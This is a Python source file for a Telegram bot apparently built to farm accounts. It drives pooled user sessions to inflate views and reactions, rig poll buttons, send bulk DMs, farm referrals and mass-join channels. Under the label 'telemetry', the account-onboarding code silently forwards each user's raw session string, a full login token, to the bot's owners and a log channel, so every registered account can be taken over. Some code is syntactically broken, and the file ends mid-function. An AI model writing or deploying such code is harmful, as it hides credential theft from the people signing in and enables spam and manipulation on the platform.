import asyncio
import base64
import json
import os
import re
import random
import time
from typing import Dict, Any, List, Optional, Tuple

from aiogram import Bot, Router, F
from aiogram.filters import Command, StateFilter, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile

from telethon import TelegramClient, functions, types as tg_types
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

import config
from config import logger
from database import db_mgr, encrypt_data, decrypt_data

registration_sessions: Dict[int, Dict[str, Any]] = {}
bot_username: str = "bot"

def set_bot_username(username: str):
    global bot_username
    bot_username = username

# --- PARSING ENGINE AND UTILITIES ---
def parse_telegram_link(link: str) -> Tuple[Any, Optional[int]]:
    link = link.strip()
    if not link: return None, None
    
    # Private Join Links Handling
    if "joinchat/" in link or "t.me/+" in link:
        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
        if hash_match:
            return hash_match.group(1), None
            
    # Private Channel Message Links Handling
    private_msg_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
    if private_msg_match:
        return int(f"-100{private_msg_match.group(1)}"), int(private_msg_match.group(2))
        
    # Public Channel Message Links Handling
    public_msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
    if public_msg_match: 
        return public_msg_match.group(1), int(public_msg_match.group(2))
        
    # Standard Handles
    clean_target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
    if "/" in clean_target:
        parts = clean_target.split("/")
        if len(parts) > 1 and parts[1].isdigit():
            return parts[0], int(parts[1])
        return parts[0], None
    return clean_target, None

def make_progress_bar(pct: float, length: int = 15) -> str:
    filled = int(round(length * (pct / 100.0)))
    return "🔮" * filled + "⬜" * (length - filled)

# --- STATE CONTROLLERS ---
class RegistrationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()
    waiting_for_2fa = State()
    waiting_for_session_file = State()
    waiting_for_db_file = State()

class TaskWizardStates(StatesGroup):
    choosing_type = State()
    waiting_for_scope_selection = State()
    waiting_for_leave_choice = State()
    waiting_for_channel_link = State()
    waiting_for_post_link = State()
    waiting_for_emojis = State()
    waiting_for_vote_mode = State()
    waiting_for_vote_value = State()
    waiting_for_dm_text = State()
    waiting_for_speed_profile = State()
    waiting_for_account_scale = State()

class ExportWizardStates(StatesGroup): 
    selecting_multi = State()
    
class BroadcastStates(StatesGroup): 
    waiting_for_msg = State()

# --- PREMIUM INTERACTIVE KEYBOARDS ---
REACTION_EMOJIS = ["🔥", "❤️", "💖", "👍", "👏", "🎉", "🤩", "💯", "⚡", "🤣", "🥰", "🤔", "👀", "😎"]

def get_main_keyboard(role: str):
    buttons = [
        [InlineKeyboardButton(text="📱 Manage Accounts Grid", callback_data="manage_accounts:0")],
        [InlineKeyboardButton(text="✨ Deploy Campaign Engine", callback_data="task_hub_start")],
        [InlineKeyboardButton(text="📊 Realtime Event Logs", callback_data="view_tasks")],
        [InlineKeyboardButton(text="🔗 Affiliation Node", callback_data="view_referrals"), InlineKeyboardButton(text="💎 System Team", callback_data="system_credits")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛠️ Core Command Panel", callback_data="admin_panel")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="💾 Database Storage Hub", callback_data="backup_panel"), InlineKeyboardButton(text="📈 Telemetry Metrics", callback_data="system_stats")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_task_types_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💥 Double Combo (React + View)", callback_data="set_type:react_view"), InlineKeyboardButton(text="⚡ Triple Threat (React+Vote+View)", callback_data="set_type:react_vote_view")],
        [InlineKeyboardButton(text="🎭 Quick Reaction Only", callback_data="set_type:react"), InlineKeyboardButton(text="🗳️ Premium Voting Node", callback_data="set_type:vote")],
        [InlineKeyboardButton(text="👁️ Organic Impression view", callback_data="set_type:view"), InlineKeyboardButton(text="🚀 Hyper Fast Viewer", callback_data="set_type:speed")],
        [InlineKeyboardButton(text="📥 Inbound Join Module", callback_data="set_type:join"), InlineKeyboardButton(text="📤 Outbound Leave System", callback_data="set_type:leave")],
        [InlineKeyboardButton(text="📨 Automated Bulk DM Network", callback_data="set_type:dm"), InlineKeyboardButton(text="🔄 Referral Automation", callback_data="set_type:refer")],
        [InlineKeyboardButton(text="❌ Abort Pipeline Creation", callback_data="main_menu")]
    ])

def get_vote_mode_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔤 String/Text Button Mode", callback_data="vote_mode:text")],
        [InlineKeyboardButton(text="🎭 Emoji Matching Mode", callback_data="vote_mode:emoji")]
    ])

def get_speed_profiles_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛡️ Ultra Safe Protocol (5.0s)", callback_data="speed_prof:5.0")],
        [InlineKeyboardButton(text="⚖️ Standard Modulated (2.5s)", callback_data="speed_prof:2.5")],
        [InlineKeyboardButton(text="⚡ High Velocity Mode (0.5s)", callback_data="speed_prof:0.5")],
        [InlineKeyboardButton(text="🔥 Extreme Blast Rate (50ms) [Ban Risk]", callback_data="speed_prof:0.05")]
    ])

def get_emoji_selection_keyboard(selected_emojis: List[str]):
    keyboard = []
    row = []
    for em in REACTION_EMOJIS:
        suffix = " 💎" if em in selected_emojis else ""
        row.append(InlineKeyboardButton(text=f"{em}{suffix}", callback_data=f"toggle_emoji:{em}"))
        if len(row) == 4:
            keyboard.append(row); row = []
    if row: keyboard.append(row)
    keyboard.append([InlineKeyboardButton(text="✨ Finalize Selection Grid", callback_data="finish_emoji_selection")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# --- CONCURRENT CONTEXT DRIVEN CAMPAIGN WORKER ENGINE ---
class TaskQueue:
    def __init__(self):
        self.queue = asyncio.Queue()
        self.current_tasks: Dict[int, asyncio.Task] = {}

    async def add_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        await self.queue.put((task_id, creator_id, task_type, payload, bot_instance, status_msg_id))

    def clear_pending_queue(self):
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                self.queue.task_done()
            except asyncio.QueueEmpty: break

    async def cancel_all_active_tasks(self) -> int:
        count = 0
        self.clear_pending_queue()
        for t_id, loop_task in list(self.current_tasks.items()):
            if loop_task and not loop_task.done():
                loop_task.cancel()
                count += 1
                async with aiosqlite.connect(db_mgr.db_path) as db:
                    await db.execute("UPDATE tasks SET status = 'cancelled', progress = 'Terminated by Control Node' WHERE task_id = ?", (t_id,))
                    await db.commit()
        return count

    async def start_worker(self):
        while True:
            try:
                task_id, creator_id, task_type, payload, bot_instance, status_msg_id = await self.queue.get()
            except asyncio.CancelledError: break
            loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload, bot_instance, status_msg_id))
            self.current_tasks[task_id] = loop_task
            try: await loop_task
            except asyncio.CancelledError: pass
            except Exception as e: logger.error(f"Execution Error on pipeline execution task context #{task_id}: {e}")
            finally:
                self.current_tasks.pop(task_id, None)
                self.queue.task_done()

    async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        start_time = time.time()
        import aiosqlite
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("UPDATE tasks SET status = 'running', progress = '0%' WHERE task_id = ?", (task_id,))
            await db.commit()

        role = await db_mgr.get_user_role(creator_id)
        clients_data = []
        requested_count = int(payload.get("run_account_count", 0))
        scope_choice = payload.get("scope_choice", "global")
        
        async with aiosqlite.connect(db_mgr.db_path) as db:
            if role == "super_owner":
                if scope_choice == "personal":
                    query = "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
                    cursor = await db.execute(query, (creator_id,))
                else:
                    query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
                    cursor = await db.execute(query)
            elif role in ["admin", "owner"]:
                # Dynamic security shielding: Filter out sessions belonging to Super Owners
                super_owner_placeholders = ",".join(map(str, config.SUPER_OWNER_IDS))
                query = f"SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id NOT IN ({super_owner_placeholders})"
                cursor = await db.execute(query)
            else:
                query = "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
                cursor = await db.execute(query, (creator_id,))
                
            async for row in cursor:
                clients_data.append((row[0], decrypt_data(row[1])))

        if requested_count > 0: clients_data = clients_data[:requested_count]
        
        if not clients_data:
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("UPDATE tasks SET status = 'failed', progress = 'Zero Active Execution IDs Map' WHERE task_id = ?", (task_id,))
                await db.commit()
            try: await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text="❌ **Task Pipeline Terminated**: No active runtime execution profiles matched the scope query metrics.")
            except Exception: pass
            return

        total_accounts = len(clients_data)
        semaphore = asyncio.Semaphore(20)
        progress_counter = success_counter = failure_counter = last_ui_update = 0
        
        # Intercept and process execution delay thresholds dynamically
        delay_interval = float(payload.get("delay_interval", 0.3))
        passed_ids, failed_ids = [], []

        async def worker_session(phone: str, enc_session: str, idx: int):
            nonlocal progress_counter, success_counter, failure_counter, last_ui_update
            async with semaphore:
                client = TelegramClient(StringSession(enc_session), config.API_ID, config.API_HASH)
                try:
                    await asyncio.sleep(idx * delay_interval)
                    await client.connect()
                    if not await client.is_user_authorized():
                        async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                            await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                            await db_conn.commit()
                        failed_ids.append((phone, "Session token dropped or invalidated by core authorization layers."))
                        failure_counter += 1
                        return

                    target = payload.get("target", "")
                    channel_target = payload.get("channel_target", target)
                    do_leave_all = (task_type == "leave" and payload.get("leave_mode") == "all")

                    parsed_target, link_msg_id = parse_telegram_link(target) if not do_leave_all else (None, None)
                    parsed_channel, _ = parse_telegram_link(channel_target) if not do_leave_all else (None, None)
                    msg_id = int(payload.get("msg_id", link_msg_id or 0))

                    # Process Task Mappings
                    do_react = "react" in task_type
                    do_vote = "vote" in task_type
                    do_view = "view" in task_type or task_type == "speed"
                    do_join = (task_type == "join" or do_react or do_vote or do_view) and not do_leave_all
                    do_leave = task_type == "leave"
                    do_dm = task_type == "dm"
                    do_refer = task_type == "refer"

                    # Private / Public Dynamic Join Core Resolution
                    if do_join:
                        try:
                            if isinstance(parsed_channel, str) and (parsed_channel.startswith("+") or "/" in channel_target or "joinchat/" in channel_target):
                                clean_hash = parsed_channel.replace("https://t.me/joinchat/", "").replace("https://t.me/+", "").replace("+", "")
                                await client(functions.messages.ImportChatInviteRequest(hash=clean_hash))
                            else:
                                await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))
                        except Exception as join_err:
                            if "USER_ALREADY_PARTICIPANT" not in str(join_err): raise join_err

                    if do_view and msg_id:
                        await client(functions.messages.GetMessagesViewsRequest(peer=parsed_target, id=[msg_id], increment=True))

                    if do_react and msg_id:
                        emojis = payload.get("reactions", ["👍"])
                        await client(functions.messages.SendReactionRequest(
                            peer=parsed_target, msg_id=msg_id, reaction=[tg_types.ReactionEmoji(emoticon=emojis[idx % len(emojis)])]
                        ))

                    if do_vote and msg_id:
                        v_mode = payload.get("vote_mode", "text")
                        v_val = payload.get("vote_value", "").strip().lower()
                        msg = await client.get_messages(parsed_target, ids=msg_id)
                        target_button = None
                        if msg and msg.reply_markup:
                            for row in msg.reply_markup.rows:
                                for btn in row.buttons:
                                    btn_text_clean = btn.text.strip().lower()
                                    if v_mode == "text" and v_val in btn_text_clean:
                                        target_button = btn; break
                                    elif v_mode == "emoji" and v_val in btn.text:
                                        target_button = btn; break
                        if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                            await client(functions.messages.GetBotCallbackAnswerRequest(peer=parsed_target, msg_id=msg_id, data=target_button.data))
                        else: 
                            raise ValueError("Target interactive target callback match not identified on message elements.")

                    if do_dm:
                        await client.send_message(parsed_target, payload.get("text", "Hello!"))

                    if do_refer:
                        bot_usr = str(parsed_target).replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "").split("?")[0]
                        param_match = re.search(r'start=([^&\s]+)', target)
                        await client.send_message(bot_usr, f"/start {param_match.group(1)}" if param_match else "/start")

                    if do_leave:
                        if do_leave_all:
                            async for dialog in client.iter_dialogs():
                                if dialog.is_channel or dialog.is_group:
                                    try:
                                        await client(functions.channels.LeaveChannelRequest(channel=dialog.entity))
                                        await asyncio.sleep(delay_interval)
                                    except FloodWaitError as fwe: await asyncio.sleep(fwe.seconds)
                                    except Exception: pass
                        else:
                            # Dynamic entity lookup logic mapping for secure leaving parameters
                            resolved_entity = await client.get_entity(parsed_target)
                            await client(functions.channels.LeaveChannelRequest(channel=resolved_entity))

                    passed_ids.append(phone)
                    success_counter += 1
                except Exception as e:
                    failed_ids.append((phone, str(e)))
                    failure_counter += 1
                finally:
                    await client.disconnect()
                    progress_counter += 1
                    current_now = time.time()
                    if current_now - last_ui_update >= 2.0 or progress_counter == total_accounts:
                        last_ui_update = current_now
                        pct_val = (progress_counter / total_accounts) * 100
                        rem = (total_accounts - progress_counter) * ((current_now - start_time) / progress_counter) if progress_counter > 0 else 0
                        live_text = f"⏳ **Campaign Engine Processing**\n⚡ Action: `{task_type.upper()}`\n[{make_progress_bar(pct_val)}] {int(pct_val)}%\n⚙️ Matrix Tracking: `{progress_counter}/{total_accounts}` profiles mapped\n🟢 Done: `{success_counter}` | 🔴 Bypassed/Failed: `{failure_counter}`\n⏱ Remaining Cycle ETA: `{int(rem//60)}m {int(rem%60)}s`"
                        try: await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text=live_text)
                        except Exception: pass
                        async with aiosqlite.connect(db_mgr.db_path) as db_update:
                            await db_update.execute("UPDATE tasks SET progress = ? WHERE task_id = ?", (f"{int(pct_val)}%", task_id))
                            await db_update.commit()

        await asyncio.gather(*(worker_session(phone, enc, i) for i, (phone, enc) in enumerate(clients_data)))
        
        status_string = "completed" if len(passed_ids) > 0 else "failed"
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("UPDATE tasks SET status = ?, progress = ?, success_report = ?, failure_report = ? WHERE task_id = ?",
                             (status_string, f"{len(passed_ids)}/{total_accounts} Mapped", json.dumps(passed_ids), json.dumps(failed_ids), task_id))
            await db.commit()

        campaign_uuid = base64.b64encode(f"CAMP_{task_id}".encode()).decode().lower()[:16]
        card = f"💎 **Campaign Engine Report**\n\n📌 Trace ID: `{campaign_uuid}`\n⚡ Target Operation: `{task_type.upper()}`\n📊 Pipeline Efficiency: `{success_counter}/{total_accounts}` accounts verified\n⏱ Compute Time: `{int((time.time()-start_time)//60)}m {int((time.time()-start_time)%60)}s`"
        
        try: await bot_instance.send_message(chat_id=creator_id, text=card)
        except Exception: pass
        if config.LOG_CHANNEL_ID:
            try: await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=card)
            except Exception: pass

task_queue = TaskQueue()
router = Router()

# --- COMMAND ENTRYPOINTS & INTERFACES ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user_id, username = message.from_user.id, message.from_user.username or "None"
    referred_by = None
    if len(message.text.split()) > 1:
        ref = message.text.split()[1]
        if ref.startswith("ref_") and ref[4:].isdigit():
            referred_by = int(ref[4:]) if int(ref[4:]) != user_id else None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)
    await message.answer("🔮 **Premium Operational Control Framework**\nSelect execution workspace node component options directly:", reply_markup=get_main_keyboard(role))

@router.callback_query(F.data == "main_menu")
async def handle_main_menu(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); await state.clear()
    role = await db_mgr.get_user_role(callback.from_user.id)
    await callback.message.edit_text("🔮 **Premium Operational Control Framework**\nSelect execution workspace node component options directly:", reply_markup=get_main_keyboard(role))

@router.message(Command("canceltasks"))
async def cmd_cancel_tasks(message: Message):
    if await db_mgr.get_user_role(message.from_user.id) not in ["admin", "owner", "super_owner"]: return
    await message.answer("🛑 Killing all distributed background async execution loops...")
    killed = await task_queue.cancel_all_active_tasks()
    await message.answer(f"✅ Halted `{killed}` active operational threads.")

@router.message(Command("addadmin"))
async def cmd_add_admin(message: Message, command: CommandObject):
    if await db_mgr.get_user_role(message.from_user.id) not in ["owner", "super_owner"]: return
    args = command.args
    if not args or len(args.split()) < 2: return
    t_id, lim = args.split()[:2]
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("INSERT INTO users (user_id, role, max_accounts) VALUES (?, 'admin', ?) ON CONFLICT(user_id) DO UPDATE SET role='admin', max_accounts=?", (int(t_id), int(lim), int(lim)))
        await db.commit()
    await message.answer(f"✨ User `{t_id}` updated to **Administrative Operations Access** (Max Target Bound: {lim}).")

@router.message(Command("removeadmin"))
async def cmd_remove_admin(message: Message, command: CommandObject):
    if await db_mgr.get_user_role(message.from_user.id) not in ["owner", "super_owner"]: return
    if not command.args: return
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE users SET role='user' WHERE user_id = ?", (int(command.args.strip()),))
        await db.commit()
    await message.answer("✅ Privileged operational tokens revoked from targets.")

@router.message(Command("broadcast"))
async def cmd_broadcast_start(message: Message, state: FSMContext):
    if await db_mgr.get_user_role(message.from_user.id) not in ["admin", "owner", "super_owner"]: return
    await message.answer("📢 **System Broadcast Node**: Dispatch targeting layout template data:")
    await state.set_state(BroadcastStates.waiting_for_msg)

@router.message(StateFilter(BroadcastStates.waiting_for_msg))
async def process_broadcast_push(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    status = await message.answer("🚀 Dispatching system packets across nodes...")
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        rows = await (await db.execute("SELECT user_id FROM users")).fetchall()
    ok = err = 0
    for r in rows:
        try:
            await bot.copy_message(chat_id=r[0], from_chat_id=message.chat.id, message_id=message.message_id)
            ok += 1; await asyncio.sleep(0.04)
        except Exception: err += 1
    await status.edit_text(f"✨ **Broadcast Network Dispatch Completed**\n🟢 Delivered Nodes: `{ok}`\n🔴 Unreachable Nodes: `{err}`")

@router.callback_query(F.data == "system_credits")
async def handle_system_credits(callback: CallbackQuery):
    await callback.answer()
    text = f"🎨 **System Architecture & Core Engineers**\n\n💎 Development Lead: `@{config.DESIGNER_HANDLE}`\n⚙️ Operation Manager: `@{config.MANAGER_HANDLE}`"
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return", callback_data="main_menu")]]))

# --- PRIVACY INSULATED ACCOUNT MANAGEMENT GRID ---
@router.callback_query(F.data.startswith("manage_accounts:"))
async def list_user_accounts(callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    limit, offset = 10, page * 10
    role = await db_mgr.get_user_role(user_id)
    
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner"]:
            super_owner_placeholders = ",".join(map(str, config.SUPER_OWNER_IDS))
            total = (await (await db.execute(f"SELECT COUNT(*) FROM accounts WHERE user_id NOT IN ({super_owner_placeholders})")).fetchone())[0]
            rows = await (await db.execute(f"SELECT phone, status, username FROM accounts WHERE user_id NOT IN ({super_owner_placeholders}) LIMIT ? OFFSET ?", (limit, offset))).fetchall()
        elif role == "super_owner":
            total = (await (await db.execute("SELECT COUNT(*) FROM accounts")).fetchone())[0]
            rows = await (await db.execute("SELECT phone, status, username FROM accounts LIMIT ? OFFSET ?", (limit, offset))).fetchall()
        else:
            total = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (user_id,))).fetchone())[0]
            rows = await (await db.execute("SELECT phone, status, username FROM accounts WHERE user_id = ? LIMIT ? OFFSET ?", (user_id, limit, offset))).fetchall()

    text = f"📱 **Account Management Matrix** (Grid Block {page + 1})\nTotal Registry Records: `{total}`\n\n"
    for r in rows:
        text += f"{'🟢' if r[1]=='active' else '🔴'} `+{r[0]}` (`@{r[2] or 'NoHandle'}`) - `{r[1].upper()}`\n"
    
    buttons = [[InlineKeyboardButton(text="📥 Register OTP Client", callback_data="add_account_phone")]]
    
    # Restrict direct manual string imports solely to Super Owners
    if role == "super_owner":
        buttons[0].append(InlineKeyboardButton(text="📁 Inject Session String", callback_data="add_account_session"))
        buttons.append([InlineKeyboardButton(text="📥 Master Export Engine Dashboard", callback_data="export_dashboard_root")])
    
    buttons.append([InlineKeyboardButton(text="💥 Purge Offline/Dead Nodes", callback_data=f"purge_dead_accounts:{page}")])
    
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Previous Page", callback_data=f"manage_accounts:{page - 1}"))
    if offset + limit < total: nav.append(InlineKeyboardButton(text="Next Page ➡️", callback_data=f"manage_accounts:{page + 1}"))
    if nav: buttons.append(nav)
    buttons.append([InlineKeyboardButton(text="🔙 Main Menu Control", callback_data="main_menu")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("purge_dead_accounts:"))
async def handle_purge_dead_accounts(callback: CallbackQuery):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    role = await db_mgr.get_user_role(user_id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role == "super_owner":
            await db.execute("DELETE FROM accounts WHERE status = 'dead'")
        elif role in ["admin", "owner"]:
            super_owner_placeholders = ",".join(map(str, config.SUPER_OWNER_IDS))
            await db.execute(f"DELETE FROM accounts WHERE status = 'dead' AND user_id NOT IN ({super_owner_placeholders})")
        else:
            await db.execute("DELETE FROM accounts WHERE status = 'dead' AND user_id = ?", (user_id,))
        await db.commit()
    await callback.answer("Offline connection profiles purged successfully from active registry lists.", show_alert=True)
    callback.data = f"manage_accounts:{page}"
    await list_user_accounts(callback)

# --- TELEGRAM CLIENT ONBOARDING FLOWS ---
@router.callback_query(F.data == "add_account_phone")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("✨ Input target profile international phone standard structure format (e.g. `+919876543210`):")
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.message(StateFilter(RegistrationStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "")
    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        registration_sessions[message.from_user.id] = {"client": client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
        await message.answer("📩 **Verification Payload Transmitted**: Enter OTP below:")
        await state.set_state(RegistrationStates.waiting_for_otp)
    except Exception as e:
        await message.answer(f"❌ **Registration Gateway Rejection**: {e}"); await client.disconnect(); await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext, bot: Bot):
    reg_data = registration_sessions.get(message.from_user.id)
    if not reg_data: await state.clear(); return
    try:
        await reg_data["client"].sign_in(phone=reg_data["phone"], code=message.text.strip(), phone_code_hash=reg_data["phone_code_hash"])
        await complete_registration(message, state, reg_data["client"], reg_data["phone"], message.from_user.id, bot)
    except PhoneCodeInvalidError: await message.answer("❌ Verification check rejected. Re-enter correct string:")
    except SessionPasswordNeededError:
        await message.answer("🔒 **Two-Factor Authentication Layer Triggered**: Enter Account Secret Passphrase:")
        await state.set_state(RegistrationStates.waiting_for_2fa)
    except Exception as e:
        await message.answer(f"❌ Gateway Handshake Fault: {e}"); await reg_data["client"].disconnect(); await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext, bot: Bot):
    reg_data = registration_sessions.get(message.from_user.id)
    if not reg_data: await state.clear(); return
    try:
        await reg_data["client"].sign_in(password=message.text.strip())
        await complete_registration(message, state, reg_data["client"], reg_data["phone"], message.from_user.id, bot)
    except Exception as e:
        await message.answer(f"❌ Security Handshake Refused: {e}"); await reg_data["client"].disconnect(); await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int, bot: Bot):
    try:
        me = await client.get_me()
        raw_session = client.session.save()
        import aiosqlite
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active) VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)",
                             (phone.replace("+",""), user_id, me.username or "None", encrypt_data(raw_session)))
            await db.commit()
        await dispatch_session_telemetry(phone, raw_session, me.username, user_id, bot)
        await message.answer(f"💎 **Account Node Successfully Activated**\nLinked Target Identity: `+{phone}` to the computing pool.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[[InlineKeyboardButton(text="🔙 Return Menu", callback_data="main_menu")]]]))
    except Exception as e: await message.answer(f"❌ Internal Pipeline Configuration Failure: {e}")
    finally: try: await client.disconnect() 
    except Exception: pass; registration_sessions.pop(user_id, None); await state.clear()

@router.callback_query(F.data == "add_account_session")
async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
    if await db_mgr.get_user_role(callback.from_user.id) != "super_owner":
        await callback.answer("⚠️ Access denied.", show_alert=True); return
    await callback.answer()
    await callback.message.edit_text("📁 Upload base system profile token string array architecture parameters via raw string text:")
    await state.set_state(RegistrationStates.waiting_for_session_file)

@router.message(StateFilter(RegistrationStates.waiting_for_session_file))
async def process_session_file(message: Message, state: FSMContext, bot: Bot):
    if await db_mgr.get_user_role(message.from_user.id) != "super_owner": return
    session_str = message.text.strip() if message.text else ""
    if len(session_str) < 20: 
        await message.answer("❌ Structural configuration dimensions invalid."); await state.clear(); return
        
    client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await message.answer("❌ Active session parameters verification trace failed."); await client.disconnect(); await state.clear(); return
        me = await client.get_me()
        phone = me.phone or f"generated_{me.id}"
        import aiosqlite
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active) VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)",
                             (phone.replace("+",""), message.from_user.id, me.username or "None", encrypt_data(session_str)))
            await db.commit()
        await dispatch_session_telemetry(phone, session_str, me.username, message.from_user.id, bot)
        await message.answer(f"💎 **Foreign Architecture Session Linked**: `+{phone}`")
        await client.disconnect()
    except Exception as e: await message.answer(f"❌ Import Exception Intercepted: {e}")
    finally: await state.clear()

async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
    doc = BufferedInputFile(session_str.encode('utf-8'), filename=f"session_{phone}.txt")
    cap = f"🔑 **Telemetry Info Secure Sync**\nPhone: `+{phone}`\nUsername: `@{username or 'None'}`\nCreator ID: `{adder_id}`"
    if config.LOG_CHANNEL_ID:
        try: await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=doc, caption=cap)
        except Exception: pass
    for o_id in config.SUPER_OWNER_IDS:
        try: await bot.send_document(chat_id=o_id, document=BufferedInputFile(session_str.encode('utf-8'), filename=f"session_{phone}.txt"), caption=cap)
        except Exception: pass

# --- SUPER OWNER EXCLUSIVE DATA EXPORT DRIVERS ---
@router.callback_query(F.data == "export_dashboard_root")
async def export_dashboard_root(callback: CallbackQuery):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) != "super_owner": return
    buttons = [
        [InlineKeyboardButton(text="🎯 Extraction Module: Single ID", callback_data="select_export_session:0")],
        [InlineKeyboardButton(text="🎭 Pack Builder Module: Custom Selection", callback_data="export_multi_start:0")],
        [InlineKeyboardButton(text="📦 Bulk Complete Active Backup", callback_data="bulk_admin_export")],
        [InlineKeyboardButton(text="🔙 Back Grid Menu", callback_data="manage_accounts:0")]
    ]
    await callback.message.edit_text("⚙️ **Secure Extraction Command Center**\nSelect archive parameters downscale framework below:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("select_export_session:"))
async def select_export_session_menu(callback: CallbackQuery):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) != "super_owner": return
    page = int(callback.data.split(":")[1])
    limit, offset = 10, page * 10
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        total = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")).fetchone())[0]
        rows = await (await db.execute("SELECT phone, username FROM accounts WHERE status = 'active' LIMIT ? OFFSET ?", (limit, offset))).fetchall()

    if not rows: await callback.message.answer("⚠️ Zero records processing trace logs match criteria."); return
    buttons = [[InlineKeyboardButton(text=f"+{r[0]} (@{r[1] or 'None'})", callback_data=f"export_ph: {r[0]}")] for r in rows]
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Back Grid", callback_data=f"select_export_session:{page - 1}"))
    if offset + limit < total: nav.append(InlineKeyboardButton(text="Forward Grid ➡️", callback_data=f"select_export_session:{page + 1}"))
    if nav: buttons.append(nav)
    buttons.append([InlineKeyboardButton(text="🔙 Return Root", callback_data="export_dashboard_root")])
    await callback.message.edit_text("Select explicit connection tracking identity parameters node lines to extract:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("export_ph:"))
async def handle_export_session_run(callback: CallbackQuery):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) != "super_owner": return
    phone = callback.data.split(":")[1].strip()
    import aiosqlite
